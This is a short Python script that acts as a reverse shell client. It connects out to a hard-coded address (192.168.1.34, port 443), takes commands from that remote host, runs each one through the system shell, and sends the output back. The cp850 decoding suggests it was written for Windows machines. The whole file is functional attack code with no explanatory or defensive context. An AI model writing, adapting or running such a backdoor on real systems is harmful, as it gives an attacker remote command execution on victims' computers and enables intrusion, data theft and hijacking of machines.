#!/usr/bin/env python3 
import socket, sys, subprocess, signal

def ctrl_c(sig, frame):
	sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

def run_command(cmd):
	try:
		stdout = subprocess.check_output(f"{cmd} 2>&1", shell=True)
		return stdout.decode("cp850")
	except subprocess.CalledProcessError as e:
		return f"Error: {e.returncode}, Stderr: {e.output.decode("cp850")}"


if __name__ == "__main__":

	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
		client_socket.connect(("192.168.1.34", 443))

		while True:
			server_cmd = client_socket.recv(1024).decode().strip()
			stdout = run_command(server_cmd)

			client_socket.send(b"\n"+stdout.encode()+b"\n")

		client_socket.close()
